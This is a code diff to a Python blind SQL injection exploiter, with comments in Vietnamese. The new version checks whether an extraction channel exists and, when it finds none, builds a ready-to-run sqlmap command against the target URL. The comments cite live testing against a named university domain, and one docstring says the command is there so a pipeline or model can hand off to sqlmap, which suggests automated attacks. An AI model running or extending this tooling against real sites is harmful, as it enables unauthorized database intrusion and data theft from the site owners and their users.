@@ -3,6 +3,11 @@
 aixsec-x — sqli_blind_poc.py
 SQLi time-based blind exploiter KHÔNG cần sqlmap (Python thuần: requests + timing).
 
+v1.4.7:
+  - _has_data_channel(): oracle im lặng (quote-parity — payload bị hấp thụ
+    trong string literal, live tbu 2026-09-20) → KHÔNG extract vô ích, báo
+    extraction_failed + sqlmap_cmd (sqlmap_runner là hướng thoát).
+
 v1.4.6:
   - MSSQL error-based oracle: SHAPES quote-then-paren ("') AND CONVERT...") —
     khớp ground-truth tbu.edu.vn (context LIKE có ngoặc).
@@ -478,6 +483,37 @@ class TimeBlindExploiter:
                 f"    Chạy: sqlmap{form} -u {self.url} --dbms={dbms} "
                 f"--technique=E --batch")
 
+    # ────────────── data channel + sqlmap guidance (v1.4.7) ──────────────
+    def _has_data_channel(self, max_probes: int = 2) -> bool:
+        """Có KÊNH TRÍCH XUẤT dữ liệu nào không?
+
+        - Oracle error-based (CONVERT conversion) còn sống → chắc chắn có.
+        - Ngược lại thử boolean/time-based (1=1): nếu có oracle thì payload
+          TRUE phải tạo khác biệt (chậm hơn baseline ≥ threshold). Trên bàn
+          'quote-parity' (template CONTAINS hấp thụ payload trong string
+          literal, live tbu 2026-09-20) mọi probe trả hệt baseline → False
+          ngay, không spam thêm.
+
+        Tối đa max_probes request để KHÔNG đốt thời gian khi oracle im lặng.
+        """
+        if self.oracle is not None:
+            return True
+        for _ in range(max_probes):
+            if self._is_true("1=1"):
+                return True
+        return False
+
+    def _extract_guidance(self, reason: str = "") -> str:
+        """Lệnh sqlmap sẵn sàng khi kênh manual im lặng — để pipeline/model
+        chuyển sang sqlmap (sqlmap_runner / CLI) mà không cần suy đoán tham số."""
+        form = " --form" if (self.method == "post" and self.data) else ""
+        dbms = self.engine if self.engine in ("mssql", "mysql") else "mssql"
+        cmd = (f"sqlmap{form} -u {self.url} --dbms={dbms} "
+               f"--technique=BEUSTQ --batch --level 1 --risk 1 --threads 1")
+        if reason:
+            return f"[!] {reason}\n[i] Chuyển sang sqlmap: {cmd}"
+        return f"[i] Chuyển sang sqlmap: {cmd}"
+
     # ────────────── helpers ──────────────
     def _is_true(self, expr: str) -> bool:
         """(expr) TRUE → SLEEP chạy → slow response."""
@@ -589,6 +625,20 @@ class TimeBlindExploiter:
         out["mode"] = self.mode
         out["injection"] = f"{self.mode}@{self.param or self.path_seg_idx} quote={self.quote or 'none'}"
         out["waf_suspected"] = self.waf_suspected
+        # v1.4.7: cần extract nhưng KHÔNG có kênh dữ liệu (oracle error-based
+        # chết + boolean/time-based cũng im lặng — quote-parity) → báo
+        # extraction_failed NGAY, không lãng phí hàng chục request vô ích.
+        if action != "detect" and not self._has_data_channel():
+            out["extraction_failed"] = True
+            err = ("Oracle trích xuất im lặng — 0 byte: mọi payload bị hấp thụ "
+                   "trong string literal (quote-parity), không có kênh boolean/"
+                   "time/error nào để đọc dữ liệu bằng manual blind.")
+            out["error"] = err
+            out["sqlmap_cmd"] = (
+                f"sqlmap{' --form' if (self.method == 'post' and self.data) else ''} "
+                f"-u {self.url} --dbms={self.engine if self.engine in ('mssql','mysql') else 'mssql'} "
+                f"--technique=BEUSTQ --batch --level 1 --risk 1 --threads 1")
+            return out
         if action in ("version", "detect"):
             out["data"]["version"] = self.version() if action == "version" else None
         elif action == "database":
@@ -665,6 +715,13 @@ def cli() -> int:
     if args.detect_only:
         print("\n[✓] CONFIRMED (detect-only)")
         return 0
+    # v1.4.7: oracle im lặng (quote-parity) → dừng sớm kèm hướng sqlmap
+    if not ex._has_data_channel():
+        print("\n[!] Oracle trích xuất im lặng — 0 byte: payload bị hấp thụ trong "
+              "string literal (quote-parity), không có kênh dữ liệu nào để extract "
+              "manual.")
+        print(ex._extract_guidance())
+        return 2
 
     data = {}
     if args.get_version:
